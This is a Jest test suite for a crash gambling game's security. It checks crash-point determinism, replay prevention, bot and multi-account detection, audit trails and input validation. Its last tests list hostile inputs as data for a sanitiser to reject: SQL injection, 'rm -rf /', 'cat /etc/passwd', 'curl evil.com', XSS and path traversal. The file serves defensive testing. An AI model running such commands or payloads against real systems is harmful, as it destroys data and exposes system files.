import * as crypto from 'crypto';

describe('Crash Game - Security Tests', () => {
  // Mock crash point generation (matching actual implementation)
  const calculateCrashPoint = (serverSeed: string, nonce: string): number => {
    const hash = crypto.createHmac('sha512', serverSeed).update(`${nonce}:CRASH`).digest('hex');

    const hexSubstring = hash.substring(0, 8);
    const decimalValue = parseInt(hexSubstring, 16);
    const normalized = decimalValue / 0xffffffff;
    let crashPoint = 1 / (1 - normalized);

    crashPoint = Math.min(Math.max(crashPoint, 1.0), 100.0);
    return crashPoint;
  };

  // Mock bet validation
  const validateBetSecurity = (
    betAmount: string,
    autoCashOutAt?: number,
  ): { valid: boolean; error?: string } => {
    const amount = parseFloat(betAmount);

    if (isNaN(amount) || !isFinite(amount)) {
      return { valid: false, error: 'Invalid bet amount format' };
    }

    if (amount < 0.01 || amount > 10000) {
      return { valid: false, error: 'Bet amount out of range' };
    }

    if (autoCashOutAt !== undefined) {
      if (isNaN(autoCashOutAt) || !isFinite(autoCashOutAt)) {
        return { valid: false, error: 'Invalid auto cash-out format' };
      }

      if (autoCashOutAt < 1.01 || autoCashOutAt > 100) {
        return { valid: false, error: 'Auto cash-out out of range' };
      }
    }

    return { valid: true };
  };

  describe('Real-Time Security Tests', () => {
    it('should prevent crash point manipulation', () => {
      const serverSeed = 'security-test-seed';
      const testNonces = ['1', '2', '3', '100', '1000'];

      // Test that crash points are deterministic and cannot be manipulated
      testNonces.forEach((nonce) => {
        const crashPoint1 = calculateCrashPoint(serverSeed, nonce);
        const crashPoint2 = calculateCrashPoint(serverSeed, nonce);

        // Same inputs should always produce same output
        expect(crashPoint1).toBe(crashPoint2);

        // Results should be within valid range
        expect(crashPoint1).toBeGreaterThanOrEqual(1.0);
        expect(crashPoint1).toBeLessThanOrEqual(100.0);

        // Should be deterministic across multiple calls
        const crashPoint3 = calculateCrashPoint(serverSeed, nonce);
        expect(crashPoint3).toBe(crashPoint1);
      });
    });

    it('should detect timing attack attempts', () => {
      const serverSeed = 'timing-attack-test';
      const nonce = '42';
      const iterations = 100;
      const timings: number[] = [];

      // Measure timing consistency for crash point generation
      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        calculateCrashPoint(serverSeed, nonce);
        const endTime = performance.now();

        timings.push(endTime - startTime);
      }

      const averageTime = timings.reduce((sum, val) => sum + val, 0) / timings.length;
      const maxTime = Math.max(...timings);
      const minTime = Math.min(...timings);
      const timeVariance = Math.max(maxTime - averageTime, averageTime - minTime);

      if (process.env.VERBOSE_TESTS) {
        console.log(`📊 Timing analysis:`);
        console.log(`   Average time: ${averageTime.toFixed(4)}ms`);
        console.log(`   Max time: ${maxTime.toFixed(4)}ms`);
        console.log(`   Min time: ${minTime.toFixed(4)}ms`);
        console.log(`   Variance: ${timeVariance.toFixed(4)}ms`);
      }

      // Validate timing consistency (prevents timing attacks)
      expect(averageTime).toBeLessThan(2.0); // Very fast on average
      expect(timeVariance).toBeLessThan(10.0); // Allow variance on shared CI runners
    });

    it('should validate WebSocket authentication requirements', () => {
      if (process.env.VERBOSE_TESTS)
        console.log('🔐 Testing WebSocket authentication validation...');

      const validTokenFormats = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE2MTYyMzkwMjJ9.signature',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI0NTYiLCJpYXQiOjE2MTYyMzkwMjJ9.signature',
      ];

      const invalidTokenFormats = [
        '', // Empty token
        'invalid-token', // Invalid format
        'Bearer ', // Empty bearer
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9', // Incomplete JWT
        null, // Null token
        undefined, // Undefined token
      ];

      // Mock token validation function
      const validateToken = (token: any): boolean => {
        if (!token || typeof token !== 'string') return false;

        const cleanToken = token.replace('Bearer ', '');
        if (cleanToken.length < 50) return false; // Minimum JWT length

        const parts = cleanToken.split('.');
        return parts.length === 3; // JWT should have 3 parts
      };

      // Test valid tokens
      validTokenFormats.forEach((token, index) => {
        const isValid = validateToken(token);
        expect(isValid).toBe(true);
        if (process.env.VERBOSE_TESTS)
          console.log(`   ✅ Valid token ${index + 1}: ${token.substring(0, 20)}...`);
      });

      // Test invalid tokens
      invalidTokenFormats.forEach((token, index) => {
        const isValid = validateToken(token);
        expect(isValid).toBe(false);
        if (process.env.VERBOSE_TESTS)
          console.log(`   ❌ Invalid token ${index + 1}: ${String(token).substring(0, 20)}...`);
      });
    });

    it('should prevent replay attacks on bets', () => {
      if (process.env.VERBOSE_TESTS) console.log('🔄 Testing replay attack prevention...');

      // Mock request tracking for replay prevention
      const requestHistory = new Set<string>();

      const generateRequestSignature = (
        userId: string,
        betAmount: string,
        timestamp: number,
        nonce: string,
      ): string => {
        return crypto
          .createHash('sha256')
          .update(`${userId}:${betAmount}:${timestamp}:${nonce}`)
          .digest('hex');
      };

      const preventReplay = (
        userId: string,
        betAmount: string,
        timestamp: number,
        nonce: string,
      ): boolean => {
        const signature = generateRequestSignature(userId, betAmount, timestamp, nonce);

        // Check if request was already processed
        if (requestHistory.has(signature)) {
          return false; // Replay detected
        }

        // Check timestamp freshness (5 minute window)
        const currentTime = Date.now();
        const maxAge = 5 * 60 * 1000; // 5 minutes
        if (currentTime - timestamp > maxAge) {
          return false; // Too old
        }

        // Add to history
        requestHistory.add(signature);
        return true; // Valid request
      };

      const testUserId = 'security-user-123';
      const testBetAmount = '100.00';
      const testTimestamp = Date.now();

      // Test legitimate requests
      const validNonces = ['1', '2', '3', '4', '5'];
      validNonces.forEach((nonce) => {
        const isValid = preventReplay(testUserId, testBetAmount, testTimestamp, nonce);
        expect(isValid).toBe(true);
        if (process.env.VERBOSE_TESTS) console.log(`   ✅ Valid request with nonce ${nonce}`);
      });

      // Test replay attempts (same nonces)
      validNonces.forEach((nonce) => {
        const isValid = preventReplay(testUserId, testBetAmount, testTimestamp, nonce);
        expect(isValid).toBe(false); // Should be rejected as replay
        if (process.env.VERBOSE_TESTS)
          console.log(`   ❌ Replay attempt with nonce ${nonce} blocked`);
      });

      // Test old timestamp
      const oldTimestamp = Date.now() - 10 * 60 * 1000; // 10 minutes ago
      const isOldValid = preventReplay(testUserId, testBetAmount, oldTimestamp, 'new-nonce');
      expect(isOldValid).toBe(false);
      if (process.env.VERBOSE_TESTS) console.log(`   ❌ Old timestamp request blocked`);
    });
  });

  describe('Anti-Fraud Tests', () => {
    it('should detect automated betting patterns', () => {
      if (process.env.VERBOSE_TESTS)
        console.log('🤖 Testing automated betting pattern detection...');

      // Mock betting pattern analysis
      const analyzeBettingPattern = (
        bets: Array<{ timestamp: number; amount: string; interval?: number }>,
      ): {
        suspicious: boolean;
        reason?: string;
        score: number;
      } => {
        let suspiciousScore = 0;

        // Calculate intervals between bets
        for (let i = 1; i < bets.length; i++) {
          const interval = bets[i].timestamp - bets[i - 1].timestamp;
          bets[i].interval = interval;

          // Very consistent intervals are suspicious
          if (interval > 0 && interval < 100) {
            suspiciousScore += 2; // Very fast betting
          }
        }

        // Check for identical amounts
        const amounts = bets.map((bet) => bet.amount);
        const uniqueAmounts = new Set(amounts);
        if (uniqueAmounts.size === 1 && bets.length > 10) {
          suspiciousScore += 3; // Always same amount
        }

        // Check for mechanical timing
        const intervals = bets
          .map((bet) => bet.interval)
          .filter((interval): interval is number => interval !== undefined);
        if (intervals.length > 0) {
          const avgInterval = intervals.reduce((sum, val) => sum + val, 0) / intervals.length;
          const variance =
            intervals.reduce((sum, val) => sum + Math.pow(val - avgInterval, 2), 0) /
            intervals.length;

          if (variance < 100 && intervals.length > 5) {
            suspiciousScore += 2; // Too consistent timing
          }
        }

        const isSuspicious = suspiciousScore >= 5;
        const reason = isSuspicious ? 'Automated pattern detected' : undefined;

        return { suspicious: isSuspicious, reason, score: suspiciousScore };
      };

      // Test normal human betting pattern
      const normalBets = [
        { timestamp: 1000, amount: '10.00' },
        { timestamp: 15000, amount: '15.50' },
        { timestamp: 45000, amount: '8.25' },
        { timestamp: 72000, amount: '20.00' },
        { timestamp: 98000, amount: '12.75' },
      ];

      const normalAnalysis = analyzeBettingPattern(normalBets);
      expect(normalAnalysis.suspicious).toBe(false);
      if (process.env.VERBOSE_TESTS)
        console.log(
          `   ✅ Normal pattern: score=${normalAnalysis.score}, suspicious=${normalAnalysis.suspicious}`,
        );

      // Test suspicious automated pattern
      const suspiciousBets: Array<{ timestamp: number; amount: string; interval?: number }> = [];
      for (let i = 0; i < 15; i++) {
        suspiciousBets.push({
          timestamp: i * 50 + 1000, // Every 50ms exactly
          amount: '100.00', // Always same amount
        });
      }

      const suspiciousAnalysis = analyzeBettingPattern(suspiciousBets);
      expect(suspiciousAnalysis.suspicious).toBe(true);
      if (process.env.VERBOSE_TESTS)
        console.log(
          `   ❌ Suspicious pattern: score=${suspiciousAnalysis.score}, reason=${suspiciousAnalysis.reason}`,
        );
    });

    it('should prevent multiple accounts betting simultaneously', () => {
      if (process.env.VERBOSE_TESTS) console.log('👥 Testing multiple account detection...');

      // Mock multi-account detection
      const detectMultiAccounting = (
        sessions: Array<{
          userId: string;
          ipAddress: string;
          userAgent: string;
          timestamp: number;
        }>,
      ): { suspicious: boolean; accounts: string[]; reason?: string } => {
        const accountsByIP = new Map<string, string[]>();
        const accountsByUserAgent = new Map<string, string[]>();
        const simultaneousBets = new Map<number, string[]>();

        // Group by IP and User Agent
        sessions.forEach((session) => {
          // Group by IP
          if (!accountsByIP.has(session.ipAddress)) {
            accountsByIP.set(session.ipAddress, []);
          }
          accountsByIP.get(session.ipAddress)!.push(session.userId);

          // Group by User Agent
          if (!accountsByUserAgent.has(session.userAgent)) {
            accountsByUserAgent.set(session.userAgent, []);
          }
          accountsByUserAgent.get(session.userAgent)!.push(session.userId);

          // Group by timestamp (simultaneous bets)
          const timeWindow = Math.floor(session.timestamp / 1000) * 1000; // 1-second windows
          if (!simultaneousBets.has(timeWindow)) {
            simultaneousBets.set(timeWindow, []);
          }
          simultaneousBets.get(timeWindow)!.push(session.userId);
        });

        // Check for suspicious patterns
        let suspiciousAccounts: string[] = [];
        let reason: string | undefined;

        // Multiple accounts from same IP
        for (const [ip, accounts] of accountsByIP) {
          const uniqueAccounts = new Set(accounts);
          if (uniqueAccounts.size > 3) {
            suspiciousAccounts.push(...uniqueAccounts);
            reason = `Multiple accounts from IP ${ip}`;
          }
        }

        // Same user agent with multiple accounts
        for (const [, accounts] of accountsByUserAgent) {
          const uniqueAccounts = new Set(accounts);
          if (uniqueAccounts.size > 2) {
            suspiciousAccounts.push(...uniqueAccounts);
            reason = reason || 'Multiple accounts with identical browser fingerprint';
          }
        }

        // Simultaneous betting
        for (const [, accounts] of simultaneousBets) {
          const uniqueAccounts = new Set(accounts);
          if (uniqueAccounts.size > 5) {
            suspiciousAccounts.push(...uniqueAccounts);
            reason = reason || 'Simultaneous betting from multiple accounts';
          }
        }

        const uniqueSuspicious = [...new Set(suspiciousAccounts)];
        return {
          suspicious: uniqueSuspicious.length > 0,
          accounts: uniqueSuspicious,
          reason,
        };
      };

      // Test normal multi-user scenario
      const normalSessions = [
        {
          userId: 'user1',
          ipAddress: '192.168.1.1',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1000,
        },
        {
          userId: 'user2',
          ipAddress: '192.168.1.2',
          userAgent: 'Mozilla/5.0 Firefox/89.0',
          timestamp: 2000,
        },
        {
          userId: 'user3',
          ipAddress: '192.168.1.3',
          userAgent: 'Mozilla/5.0 Safari/14.1',
          timestamp: 3000,
        },
      ];

      const normalResult = detectMultiAccounting(normalSessions);
      expect(normalResult.suspicious).toBe(false);
      if (process.env.VERBOSE_TESTS)
        console.log(`   ✅ Normal sessions: ${normalResult.accounts.length} suspicious accounts`);

      // Test suspicious multi-accounting
      const suspiciousSessions = [
        {
          userId: 'multi1',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1000,
        },
        {
          userId: 'multi2',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1050,
        },
        {
          userId: 'multi3',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1100,
        },
        {
          userId: 'multi4',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1150,
        },
        {
          userId: 'multi5',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 Chrome/91.0',
          timestamp: 1200,
        },
      ];

      const suspiciousResult = detectMultiAccounting(suspiciousSessions);
      expect(suspiciousResult.suspicious).toBe(true);
      if (process.env.VERBOSE_TESTS)
        console.log(
          `   ❌ Suspicious sessions: ${suspiciousResult.accounts.length} flagged accounts`,
        );
      if (process.env.VERBOSE_TESTS) console.log(`   Reason: ${suspiciousResult.reason}`);
    });

    it('should validate bet amount limits per user', () => {
      if (process.env.VERBOSE_TESTS) console.log('💰 Testing bet amount limit validation...');

      // Mock user betting limits
      const validateBetLimits = (
        userId: string,
        betAmount: string,
        userBetHistory: Array<{ amount: string; timestamp: number }>,
      ): {
        valid: boolean;
        reason?: string;
        dailyTotal?: number;
        limitReached?: boolean;
      } => {
        const amount = parseFloat(betAmount);
        const currentTime = Date.now();
        const oneDayAgo = currentTime - 24 * 60 * 60 * 1000;

        // Calculate daily total
        const dailyBets = userBetHistory.filter((bet) => bet.timestamp > oneDayAgo);
        const dailyTotal = dailyBets.reduce((sum, bet) => sum + parseFloat(bet.amount), 0);

        // Define limits based on user tier (simplified)
        const maxSingleBet = 10000; // $10,000
        const maxDailyBets = 50000; // $50,000

        // Check single bet limit
        if (amount > maxSingleBet) {
          return {
            valid: false,
            reason: `Single bet exceeds limit of $${maxSingleBet}`,
            dailyTotal,
            limitReached: true,
          };
        }

        // Check daily limit
        if (dailyTotal + amount > maxDailyBets) {
          return {
            valid: false,
            reason: `Daily betting limit of $${maxDailyBets} would be exceeded`,
            dailyTotal,
            limitReached: true,
          };
        }

        return {
          valid: true,
          dailyTotal,
          limitReached: false,
        };
      };

      // Test normal betting within limits
      const normalHistory = [
        { amount: '100.00', timestamp: Date.now() - 3600000 }, // 1 hour ago
        { amount: '50.00', timestamp: Date.now() - 7200000 }, // 2 hours ago
        { amount: '200.00', timestamp: Date.now() - 10800000 }, // 3 hours ago
      ];

      const normalResult = validateBetLimits('normal-user', '100.00', normalHistory);
      expect(normalResult.valid).toBe(true);
      if (process.env.VERBOSE_TESTS)
        console.log(`   ✅ Normal bet: $100, daily total: $${normalResult.dailyTotal}`);

      // Test single bet limit violation
      const highBetResult = validateBetLimits('high-roller', '15000.00', []);
      expect(highBetResult.valid).toBe(false);
      expect(highBetResult.limitReached).toBe(true);
      if (process.env.VERBOSE_TESTS)
        console.log(`   ❌ High bet violation: ${highBetResult.reason}`);

      // Test daily limit violation
      const heavyHistory: Array<{ amount: string; timestamp: number }> = [];
      for (let i = 0; i < 20; i++) {
        heavyHistory.push({
          amount: '2500.00',
          timestamp: Date.now() - i * 3600000, // Each hour for 20 hours
        });
      }

      const dailyLimitResult = validateBetLimits('heavy-user', '1000.00', heavyHistory);
      expect(dailyLimitResult.valid).toBe(false);
      if (process.env.VERBOSE_TESTS)
        console.log(`   ❌ Daily limit violation: ${dailyLimitResult.reason}`);
      if (process.env.VERBOSE_TESTS) console.log(`   Daily total: $${dailyLimitResult.dailyTotal}`);
    });

    it('should detect suspicious cash-out patterns', () => {
      if (process.env.VERBOSE_TESTS)
        console.log('📈 Testing suspicious cash-out pattern detection...');

      // Mock cash-out pattern analysis
      const analyzeCashOutPattern = (
        cashOuts: Array<{
          multiplier: number;
          timestamp: number;
          result: 'WIN' | 'LOSE';
          crashPoint: number;
        }>,
      ): { suspicious: boolean; reason?: string; score: number } => {
        let suspiciousScore = 0;

        // Check for always cashing out just before crash
        const wins = cashOuts.filter((co) => co.result === 'WIN');
        const perfectTiming = wins.filter(
          (win) => win.crashPoint - win.multiplier < 0.1, // Cash out very close to crash
        );

        if (perfectTiming.length / wins.length > 0.8 && wins.length > 10) {
          suspiciousScore += 5; // Suspiciously good timing
        }

        // Check for mechanical cash-out multipliers
        const multipliers = cashOuts.map((co) => co.multiplier);
        const uniqueMultipliers = new Set(multipliers);
        if (uniqueMultipliers.size < multipliers.length / 4) {
          suspiciousScore += 3; // Too few unique multipliers
        }

        // Check win rate
        const winRate = wins.length / cashOuts.length;
        if (winRate > 0.9 && cashOuts.length > 20) {
          suspiciousScore += 4; // Impossibly high win rate
        }

        const isSuspicious = suspiciousScore >= 6;
        const reason = isSuspicious ? 'Suspicious cash-out pattern detected' : undefined;

        return { suspicious: isSuspicious, reason, score: suspiciousScore };
      };

      // Test normal cash-out pattern
      const normalCashOuts = [
        { multiplier: 1.5, timestamp: 1000, result: 'WIN' as const, crashPoint: 2.1 },
        { multiplier: 2.0, timestamp: 2000, result: 'WIN' as const, crashPoint: 3.5 },
        { multiplier: 2.5, timestamp: 3000, result: 'LOSE' as const, crashPoint: 2.0 },
        { multiplier: 1.8, timestamp: 4000, result: 'WIN' as const, crashPoint: 4.2 },
        { multiplier: 3.0, timestamp: 5000, result: 'LOSE' as const, crashPoint: 2.8 },
        { multiplier: 1.2, timestamp: 6000, result: 'WIN' as const, crashPoint: 5.1 },
      ];

      const normalAnalysis = analyzeCashOutPattern(normalCashOuts);
      expect(normalAnalysis.suspicious).toBe(false);
      if (process.env.VERBOSE_TESTS)
        console.log(
          `   ✅ Normal pattern: score=${normalAnalysis.score}, suspicious=${normalAnalysis.suspicious}`,
        );

      // Test suspicious pattern (perfect timing)
      const suspiciousCashOuts: Array<{
        multiplier: number;
        timestamp: number;
        result: 'WIN' | 'LOSE';
        crashPoint: number;
      }> = [];
      for (let i = 0; i < 25; i++) {
        const crashPoint = 2.0 + Math.random() * 3.0; // 2.0-5.0x
        const multiplier = crashPoint - 0.05; // Always cash out just before crash
        suspiciousCashOuts.push({
          multiplier,
          timestamp: i * 1000,
          result: 'WIN' as const,
          crashPoint,
        });
      }

      const suspiciousAnalysis = analyzeCashOutPattern(suspiciousCashOuts);
      expect(suspiciousAnalysis.suspicious).toBe(true);
      if (process.env.VERBOSE_TESTS)
        console.log(
          `   ❌ Suspicious pattern: score=${suspiciousAnalysis.score}, reason=${suspiciousAnalysis.reason}`,
        );
    });
  });

  describe('Game Integrity Tests', () => {
    it('should maintain deterministic crash point generation', () => {
      if (process.env.VERBOSE_TESTS)
        console.log('🎲 Testing deterministic generation integrity...');

      const serverSeed = 'integrity-test-seed';
      const testCases = [
        { nonce: '1', expectedConsistency: true },
        { nonce: '42', expectedConsistency: true },
        { nonce: '1000', expectedConsistency: true },
        { nonce: '999999', expectedConsistency: true },
      ];

      testCases.forEach((testCase) => {
        const results: number[] = [];

        // Generate same crash point multiple times
        for (let i = 0; i < 10; i++) {
          const crashPoint = calculateCrashPoint(serverSeed, testCase.nonce);
          results.push(crashPoint);
        }

        // All results should be identical
        const allSame = results.every((result) => result === results[0]);
        expect(allSame).toBe(testCase.expectedConsistency);

        // Should be in valid range
        expect(results[0]).toBeGreaterThanOrEqual(1.0);
        expect(results[0]).toBeLessThanOrEqual(100.0);

        if (process.env.VERBOSE_TESTS)
          console.log(
            `   Nonce ${testCase.nonce}: ${results[0].toFixed(4)}x (${allSame ? 'consistent' : 'inconsistent'})`,
          );
      });
    });

    it('should prevent server seed prediction', () => {
      if (process.env.VERBOSE_TESTS) console.log('🔮 Testing server seed prediction prevention...');

      const knownResults: Array<{ seed: string; nonce: string; crashPoint: number }> = [];
      const testSeeds = ['seed-1', 'seed-2', 'seed-3', 'seed-4', 'seed-5'];

      // Generate known results
      testSeeds.forEach((seed) => {
        for (let nonce = 1; nonce <= 10; nonce++) {
          const crashPoint = calculateCrashPoint(seed, nonce.toString());
          knownResults.push({ seed, nonce: nonce.toString(), crashPoint });
        }
      });

      // Try to predict next result with unknown seed
      const unknownSeed = 'unknown-seed-123';
      const unknownNonce = '11';
      const unknownResult = calculateCrashPoint(unknownSeed, unknownNonce);

      // Check if unknown result matches any pattern
      const matchesPattern = knownResults.some(
        (known) => Math.abs(known.crashPoint - unknownResult) < 0.001,
      );

      if (process.env.VERBOSE_TESTS) {
        console.log(`📊 Prediction resistance test:`);
        console.log(`   Known results: ${knownResults.length}`);
        console.log(`   Unknown result: ${unknownResult.toFixed(4)}x`);
        console.log(`   Matches known pattern: ${matchesPattern}`);
      }

      // Should not be easily predictable from known results
      expect(unknownResult).toBeGreaterThanOrEqual(1.0);
      expect(unknownResult).toBeLessThanOrEqual(100.0);

      // Validate that the algorithm is not easily reversible
      expect(typeof unknownResult).toBe('number');
      expect(Number.isFinite(unknownResult)).toBe(true);
    });

    it('should validate nonce incrementation security', () => {
      if (process.env.VERBOSE_TESTS) console.log('🔢 Testing nonce incrementation security...');

      const serverSeed = 'nonce-security-test';
      const nonces = ['1', '2', '3', '4', '5', '10', '100', '1000'];
      const results = new Map<string, number>();

      // Generate results for different nonces
      nonces.forEach((nonce) => {
        const crashPoint = calculateCrashPoint(serverSeed, nonce);
        results.set(nonce, crashPoint);

        // Each nonce should produce different result
        expect(crashPoint).toBeGreaterThanOrEqual(1.0);
        expect(crashPoint).toBeLessThanOrEqual(100.0);

        if (process.env.VERBOSE_TESTS) console.log(`   Nonce ${nonce}: ${crashPoint.toFixed(4)}x`);
      });

      // Validate that different nonces produce different results
      const crashPoints = Array.from(results.values());
      const uniqueCrashPoints = new Set(crashPoints);

      // Should have high diversity
      expect(uniqueCrashPoints.size).toBe(crashPoints.length);

      // Test nonce tampering resistance
      const tamperNonce = '1modified';
      const tamperedResult = calculateCrashPoint(serverSeed, tamperNonce);
      const originalResult = results.get('1')!;

      expect(tamperedResult).not.toBeCloseTo(originalResult, 2);
      console.log(`   Original nonce '1': ${originalResult.toFixed(4)}x`);
      console.log(`   Tampered nonce '1modified': ${tamperedResult.toFixed(4)}x`);
    });

    it('should ensure audit trail completeness', () => {
      if (process.env.VERBOSE_TESTS) console.log('📋 Testing audit trail completeness...');

      // Mock audit trail entry
      const createAuditEntry = (
        gameId: string,
        serverSeed: string,
        nonce: string,
        crashPoint: number,
      ) => {
        return {
          gameId,
          serverSeed,
          serverSeedHash: crypto.createHash('sha256').update(serverSeed).digest('hex'),
          nonce,
          crashPoint,
          timestamp: Date.now(),
          algorithm: 'HMAC-SHA512',
          verification: {
            reproducible: true,
            hashMatches: true,
            rangeValid: crashPoint >= 1.0 && crashPoint <= 100.0,
          },
        };
      };

      // Test audit entries for multiple games
      const auditEntries: Array<{
        gameId: string;
        serverSeed: string;
        serverSeedHash: string;
        nonce: string;
        crashPoint: number;
        timestamp: number;
        algorithm: string;
        verification: {
          reproducible: boolean;
          hashMatches: boolean;
          rangeValid: boolean;
        };
      }> = [];
      for (let gameId = 1; gameId <= 10; gameId++) {
        const serverSeed = `game-seed-${gameId}`;
        const nonce = gameId.toString();
        const crashPoint = calculateCrashPoint(serverSeed, nonce);

        const auditEntry = createAuditEntry(`game-${gameId}`, serverSeed, nonce, crashPoint);
        auditEntries.push(auditEntry);

        // Validate audit entry completeness
        expect(auditEntry.gameId).toBeDefined();
        expect(auditEntry.serverSeed).toBeDefined();
        expect(auditEntry.serverSeedHash).toBeDefined();
        expect(auditEntry.nonce).toBeDefined();
        expect(auditEntry.crashPoint).toBeDefined();
        expect(auditEntry.timestamp).toBeDefined();
        expect(auditEntry.algorithm).toBe('HMAC-SHA512');
        expect(auditEntry.verification.reproducible).toBe(true);
        expect(auditEntry.verification.hashMatches).toBe(true);
        expect(auditEntry.verification.rangeValid).toBe(true);

        if (process.env.VERBOSE_TESTS)
          console.log(`   Game ${gameId}: ${crashPoint.toFixed(4)}x (audit complete)`);
      }

      // Validate audit trail integrity
      expect(auditEntries).toHaveLength(10);

      // Test verification of audit entries
      auditEntries.forEach((entry) => {
        const verifiedCrashPoint = calculateCrashPoint(entry.serverSeed, entry.nonce);
        expect(verifiedCrashPoint).toBeCloseTo(entry.crashPoint, 6);

        const verifiedHash = crypto.createHash('sha256').update(entry.serverSeed).digest('hex');
        expect(verifiedHash).toBe(entry.serverSeedHash);
      });

      if (process.env.VERBOSE_TESTS)
        console.log(`   ✅ All ${auditEntries.length} audit entries verified`);
    });
  });

  describe('Input Validation Security', () => {
    it('should validate and sanitize all bet inputs', () => {
      console.log('🛡️ Testing bet input validation security...');

      const maliciousInputs = [
        { betAmount: '-100.00', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: '999999999999999', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: 'DROP TABLE bets;', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: '100.00', autoCashOutAt: -1.0, expectedValid: false },
        { betAmount: '100.00', autoCashOutAt: 999999, expectedValid: false },
        { betAmount: '<script>alert("xss")</script>', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: 'NaN', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: 'Infinity', autoCashOutAt: 2.0, expectedValid: false },
        { betAmount: '100.00', autoCashOutAt: NaN, expectedValid: false },
        { betAmount: '100.00', autoCashOutAt: Infinity, expectedValid: false },
      ];

      const validInputs = [
        { betAmount: '10.00', autoCashOutAt: 2.0, expectedValid: true },
        { betAmount: '0.01', autoCashOutAt: 1.01, expectedValid: true },
        { betAmount: '1000.00', autoCashOutAt: 100.0, expectedValid: true },
        { betAmount: '50.50', autoCashOutAt: undefined, expectedValid: true },
      ];

      console.log('   Testing malicious inputs:');
      maliciousInputs.forEach((input, index) => {
        const result = validateBetSecurity(input.betAmount, input.autoCashOutAt);
        expect(result.valid).toBe(input.expectedValid);
        console.log(
          `   ❌ Malicious ${index + 1}: "${String(input.betAmount).substring(0, 20)}" -> ${result.valid ? 'ACCEPTED' : 'REJECTED'}`,
        );
      });

      console.log('   Testing valid inputs:');
      validInputs.forEach((input, index) => {
        const result = validateBetSecurity(input.betAmount, input.autoCashOutAt);
        expect(result.valid).toBe(input.expectedValid);
        console.log(
          `   ✅ Valid ${index + 1}: "${input.betAmount}" -> ${result.valid ? 'ACCEPTED' : 'REJECTED'}`,
        );
      });
    });

    it('should prevent injection attacks in user inputs', () => {
      console.log('💉 Testing injection attack prevention...');

      const injectionAttempts = [
        // SQL injection attempts
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        'UNION SELECT * FROM admin_users',

        // NoSQL injection attempts
        '{"$ne": null}',
        '{"$gt": ""}',

        // Command injection attempts
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl evil.com',

        // XSS attempts
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onmouseover="alert(1)"',

        // Path traversal
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
      ];

      // Mock input sanitization
      const sanitizeInput = (input: string): { safe: boolean; sanitized: string } => {
        if (typeof input !== 'string') {
          return { safe: false, sanitized: '' };
        }

        // Check for dangerous patterns
        const dangerousPatterns = [
          /[<>'"]/g, // HTML/JS dangerous chars
          /\b(DROP|DELETE|INSERT|UPDATE|SELECT)\b/gi, // SQL keywords
          /\$\w+/g, // MongoDB operators
          /[;&|\`]/g, // Command injection chars (escaped backtick)
          /\.\.\//g, // Path traversal (Linux)
          /\.\.\\+/g, // Path traversal (Windows)
        ];

        const hasDangerousContent = dangerousPatterns.some((pattern) => pattern.test(input));

        if (hasDangerousContent) {
          return { safe: false, sanitized: '' };
        }

        // Basic sanitization
        const sanitized = input
          .replace(/[<>'"]/g, '') // Remove dangerous chars
          .substring(0, 100); // Limit length

        return { safe: true, sanitized };
      };

      injectionAttempts.forEach((attempt) => {
        const result = sanitizeInput(attempt);
        expect(result.safe).toBe(false);
      });

      // Test safe inputs
      const safeInputs = ['100.00', 'player123', 'normal text', '2.5'];
      safeInputs.forEach((input) => {
        const result = sanitizeInput(input);
        expect(result.safe).toBe(true);
      });
    });
  });
});
